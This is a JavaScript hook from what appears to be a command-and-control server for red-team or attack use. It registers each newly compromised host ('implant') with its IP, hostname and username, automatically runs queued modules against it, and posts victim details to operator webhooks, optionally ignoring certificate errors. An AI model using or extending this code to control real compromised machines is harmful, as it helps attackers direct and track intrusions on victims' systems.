// Use this hook to manipulate incoming or outgoing data.
// For more information on hooks see: http://docs.feathersjs.com/api/hooks.html

// eslint-disable-next-line no-unused-vars

const srs = require('secure-random-string');

const axios = require('axios');

const https = require('https');

module.exports = function (options = {}) {
  return async context => {
    const { data } = context;

    var data2 = {};

    // Data validation
    // TODO: Validate IP addresses?
    data2.localIp = data.localIp ? data.localIp.substring(0,15) : "";

    data2.sourceIp = data.sourceIp ? data.sourceIp.substring(0,15) : "";

    data2.os = data.os ? data.os.substring(0,15) : "";

    data2.hostname = data.hostname ? data.hostname.substring(0,50) : "";

    data2.username = data.username ? data.username.substring(0,15) : "";

    data2.handler = data.handler ? data.handler.substring(0,15) : "";

    data2.connectionString = data.connectionString ? data.connectionString.substring(0,100) : "";

    data2.implantType = data.implantType ? data.implantType.substring(0,30) : "";

    data2.config = data.config ? data.config : {};

    data2.supportedPayloads = data.supportedPayloads ? data.supportedPayloads : ["Unknown"];

    data2._id = srs({length: context.app.get('id_length'), alphanumeric: true});

    data2.createdAt = Date.now();

    data2.lastSeen = data2.createdAt;

    data2.listener = context.params.headers.listener ? context.params.headers.listener: "";
   
    // Actually create the implant
    const implant = await context.app.service('implants').create(data2);
    
    // Run autorun modules
    context.app.service('/modules/run').find({query: {autorun: true}}).then(autoruns =>{
      for(var i=0; i< autoruns.data.length; i++){
        var options = autoruns.data[i].options;
        options.implant = {value: data2._id};
        context.app.service('/modules/run').create({moduleId: autoruns.data[i].moduleId, options: options, autorun: false})
      }
    });


    context.app.service('/webhooks').find().then(webhooks =>{
      for(var i=0; i< webhooks.data.length; i++){
        var webhook = webhooks.data[i];

        var instance = axios.create({
          httpsAgent: new https.Agent({  
            rejectUnauthorized: !webhook.ignoreCertErrors
          })
        });
        
        var message = webhook.customMessage !== "" ? webhook.customMessage : "### New Implant! :fire:" ;
        instance.post(webhook.url, {
          username:'New Implant Bot',
          text: message + " \n| Hostname | Username | IP Address |\n|:---------|:--------:|:-----------|\n|"+data.hostname+"|"+data.username+"|"+data.localIp+"|\n"
        })
        .catch(error => {
          console.error(error);
        });
        }
    }).catch(error => {
      console.error(error);
    });
    
    context.data = {_id: implant._id};
    //context.data = implant;
  };
};
